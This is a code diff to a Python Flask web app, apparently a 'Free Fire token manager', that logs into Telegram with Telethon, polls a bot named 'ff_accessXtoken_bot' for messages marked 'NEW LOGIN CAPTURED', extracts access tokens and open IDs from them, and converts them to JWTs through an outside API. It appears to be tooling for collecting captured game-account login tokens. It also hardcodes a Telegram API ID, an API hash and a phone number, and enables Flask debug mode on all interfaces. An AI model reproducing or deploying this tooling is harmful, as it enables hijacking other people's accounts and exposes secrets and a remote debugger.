@@ -2,6 +2,7 @@ import os
 import re
 import json
 import base64
+import asyncio
 import requests
 from datetime import datetime
 from flask import Flask, render_template_string, request, jsonify
@@ -11,12 +12,17 @@ from telethon.sessions import StringSession
 # ==================== CONFIG ====================
 API_ID = int(os.environ.get('API_ID', 33435112))
 API_HASH = os.environ.get('API_HASH', '89b7361a12dc0d54dd1973c8a95647b6')
-USER_PHONE = os.environ.get('USER_PHONE', '+9197970462807')
+USER_PHONE = os.environ.get('USER_PHONE', '+917970462807')
 TARGET_BOT = os.environ.get('TARGET_BOT', 'ff_accessXtoken_bot')
 JWT_API = os.environ.get('JWT_API', 'https://ff-jwt-gen-api.lovable.app/api/public/token')
 
 # ==================== FLASK APP ====================
 app = Flask(__name__)
+
+# ==================== IN-MEMORY STORAGE ====================
+tokens_store = []
+sessions_store = {}
+pending_data = {}  # Store phone_code_hash per phone
 
 # ==================== HTML TEMPLATE ====================
 HTML_TEMPLATE = '''
@@ -409,6 +415,7 @@ HTML_TEMPLATE = '''
         let isRunning = false;
         let checkCount = 0;
         let pendingPhoneCodeHash = null;
+        let pendingPhone = null;
 
         function showToast(message, type = 'success') {
             const toast = document.getElementById('toast');
@@ -436,8 +443,9 @@ HTML_TEMPLATE = '''
                     showToast('✅ Login successful!', 'success');
                     loadTokens();
                 } else if (data.need_code) {
+                    pendingPhone = phone;
                     pendingPhoneCodeHash = data.phone_code_hash;
-                    const code = prompt('📱 Enter verification code sent to your Telegram:');
+                    const code = prompt('📱 Enter verification code sent to your Telegram:\n(Check your Telegram app)');
                     if (code) {
                         const verifyResponse = await fetch('/api/verify', {
                             method: 'POST',
@@ -576,17 +584,10 @@ HTML_TEMPLATE = '''
 </html>
 '''
 
-# ==================== IN-MEMORY STORAGE (Vercel Compatible) ====================
-# Vercel doesn't support persistent file storage, so we use in-memory
-# For production, use a database like Vercel Postgres or Supabase
-tokens_store = []
-sessions_store = {}
-pending_phone_code_hash_store = {}
-
-# ==================== TELEGRAM LOGIN FUNCTIONS ====================
-async def login_telegram(phone, code=None, phone_code_hash=None):
+# ==================== TELEGRAM FUNCTIONS ====================
+async def do_login(phone, code=None, phone_code_hash=None):
     try:
-        # Check if session exists in memory
+        # Check if session exists
         session_str = sessions_store.get(phone)
         if session_str:
             client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
@@ -595,10 +596,12 @@ async def login_telegram(phone, code=None, phone_code_hash=None):
         
         await client.connect()
         
+        # Check if already authorized
         if await client.is_user_authorized():
             me = await client.get_me()
             return {"success": True, "message": f"Already logged in as {me.first_name}", "username": me.username}
         
+        # If code provided, verify
         if code and phone_code_hash:
             try:
                 await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
@@ -614,10 +617,11 @@ async def login_telegram(phone, code=None, phone_code_hash=None):
             except Exception as e:
                 return {"success": False, "message": str(e)}
         else:
+            # Send code
             try:
                 send_code_result = await client.send_code_request(phone)
                 phone_code_hash = send_code_result.phone_code_hash
-                pending_phone_code_hash_store[phone] = phone_code_hash
+                pending_data[phone] = {"phone_code_hash": phone_code_hash, "client": client}
                 return {"success": False, "need_code": True, "message": "Verification code sent", "phone_code_hash": phone_code_hash}
             except errors.rpcerrorlist.PhoneNumberInvalidError:
                 return {"success": False, "message": "Invalid phone number"}
@@ -635,9 +639,8 @@ async def login_telegram(phone, code=None, phone_code_hash=None):
     except Exception as e:
         return {"success": False, "message": str(e)}
 
-async def capture_token():
+async def do_capture_token():
     try:
-        # Get first session from memory
         if not sessions_store:
             return {"success": False, "message": "Not logged in"}
         
@@ -650,11 +653,9 @@ async def capture_token():
         if not await client.is_user_authorized():
             return {"success": False, "message": "Session expired"}
         
-        # Open bot
         await client.send_message(f"@{TARGET_BOT}", "/start")
         await asyncio.sleep(2)
         
-        # Get messages
         async for message in client.iter_messages(f"@{TARGET_BOT}", limit=10):
             if message.text and "ɴᴇᴡ ʟᴏɢɪɴ ᴄᴀᴘᴛᴜʀᴇᴅ" in message.text:
                 token_match = re.search(r'ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ\s*`([a-f0-9]+)`', message.text, re.I)
@@ -664,12 +665,10 @@ async def capture_token():
                     access_token = token_match.group(1)
                     open_id = open_id_match.group(1) if open_id_match else None
                     
-                    # Check if already captured
                     for token in tokens_store:
                         if token.get('access_token') == access_token:
                             return {"success": True, "message": "Token already captured", "new": False}
                     
-                    # Get JWT from API
                     jwt = None
                     uid = None
                     name = None
@@ -723,7 +722,6 @@ def api_status():
 
 @app.route('/api/login', methods=['POST'])
 def api_login():
-    import asyncio
     data = request.json
     phone = data.get('phone')
     
@@ -732,12 +730,11 @@ def api_login():
     
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
-    result = loop.run_until_complete(login_telegram(phone))
+    result = loop.run_until_complete(do_login(phone))
     return jsonify(result)
 
 @app.route('/api/verify', methods=['POST'])
 def api_verify():
-    import asyncio
     data = request.json
     phone = data.get('phone')
     code = data.get('code')
@@ -748,15 +745,14 @@ def api_verify():
     
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
-    result = loop.run_until_complete(login_telegram(phone, code, phone_code_hash))
+    result = loop.run_until_complete(do_login(phone, code, phone_code_hash))
     return jsonify(result)
 
 @app.route('/api/check-token')
 def api_check_token():
-    import asyncio
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
-    result = loop.run_until_complete(capture_token())
+    result = loop.run_until_complete(do_capture_token())
     return jsonify(result)
 
 @app.route('/api/tokens')
@@ -765,8 +761,6 @@ def api_tokens():
 
 @app.route('/api/start-check', methods=['POST'])
 def api_start_check():
-    # Vercel doesn't support background threads
-    # This is a placeholder - actual auto-check would need a separate worker
     return jsonify({"success": True, "message": "Auto-check started (simulated)"})
 
 @app.route('/api/stop-check', methods=['POST'])
@@ -774,11 +768,10 @@ def api_stop_check():
     return jsonify({"success": True, "message": "Auto-check stopped (simulated)"})
 
 # ==================== FOR VERCEL ====================
-# This is the handler that Vercel uses
 def handler(request, context):
     return app(request, context)
 
-# ==================== MAIN (Local Development Only) ====================
+# ==================== MAIN ====================
 if __name__ == '__main__':
     print("=" * 60)
     print("🔥 FF TOKEN MANAGER - Vercel Compatible")
@@ -788,6 +781,5 @@ if __name__ == '__main__':
     print(f"🔑 JWT API: {JWT_API}")
     print("=" * 60)
     print("🌐 Server running at http://localhost:5000")
-    print("⚠️  Note: Vercel uses in-memory storage only")
     print("=" * 60)
-    app.run(host='0.0.0.0', port=5000, debug=False)
+    app.run(host='0.0.0.0', port=5000, debug=True)
